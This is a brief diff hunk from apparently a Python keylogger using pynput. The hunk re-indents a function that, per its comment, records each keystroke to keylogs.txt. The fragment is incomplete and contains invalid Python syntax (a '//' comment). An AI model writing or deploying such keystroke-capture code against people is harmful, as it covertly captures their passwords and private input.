@@ -1,6 +1,6 @@
 from pynput import keyboard							
 
-  def keyPressed(key):								//keypress function defined to record key strokes and write them to keylogs.txt
+	def keyPressed(key):								//keypress function defined to record key strokes and write them to keylogs.txt
 		print(str(key))
 		with open("keylogs.txt", 'a') as logKey:
 			try:
